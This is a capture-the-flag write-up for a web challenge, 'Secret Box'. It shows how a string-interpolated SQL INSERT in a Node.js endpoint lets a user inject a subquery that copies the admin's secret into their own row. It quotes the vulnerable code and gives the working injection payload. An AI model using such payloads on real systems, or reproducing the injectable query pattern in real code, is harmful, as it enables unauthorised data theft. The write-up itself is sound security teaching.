# Secret Box CTF Writeup

**Challenge**: Secret Box  
**Category**: Web  
**Goal**: Exfiltrate the admin's secret

## Summary
The app stores secrets in a PostgreSQL database. The `POST /secrets/create` endpoint builds an `INSERT` query using string interpolation, which makes it vulnerable to SQL injection. We can inject a subquery inside the same `INSERT` statement to read the admin’s secret and save it as a secret owned by our user.

## Key Files
1. `app/src/server.js`
1. `db/initdb.sql`

## Vulnerability
In `app/src/server.js`, the `content` field is directly concatenated into SQL:

```js
await db.raw(
  `INSERT INTO secrets(owner_id, content) VALUES ('${userId}', '${content}')`
);
```

This allows us to break out of the string and inject SQL.

## Data Target
The admin user id is defined in `db/initdb.sql`:

```sql
INSERT INTO users(id, username, password)
VALUES ('e2a66f7d-2ce6-4861-b4aa-be8e069601cb', 'admin', 'fake_password');
```

The flag is stored in the admin’s `secrets` row.

## Exploit Strategy
Instead of trying to run a second statement, inject a subquery inside the same `INSERT` statement by using string concatenation (`||`). This avoids multi‑statement restrictions and quote‑balancing issues.

## Steps
1. Sign up and log in as any user (e.g. `attacker`).
1. Go to **Create New Secret**.
1. Use this payload in the content field:

```text
x' || (SELECT content FROM secrets WHERE owner_id='e2a66f7d-2ce6-4861-b4aa-be8e069601cb' LIMIT 1) || '
```

4. Submit the form.
5. Return to `/` and view **My Secrets**. The new secret you created will contain the admin’s secret (the flag).

## Why This Works
The server query becomes:

```sql
INSERT INTO secrets(owner_id, content)
VALUES ('<your_user_id>', 'x' ||
  (SELECT content FROM secrets WHERE owner_id='e2a66f7d-2ce6-4861-b4aa-be8e069601cb' LIMIT 1)
|| '')
```

This is valid SQL, stays in a single statement, and safely injects the admin’s secret into your own secret entry.

## Notes
Multi‑statement payloads often fail here because:
1. The query is built inside a single-quoted string.
1. Any leftover `')` at the end of the original query must be fully neutralized.
1. Some PostgreSQL drivers disallow multiple statements per query.

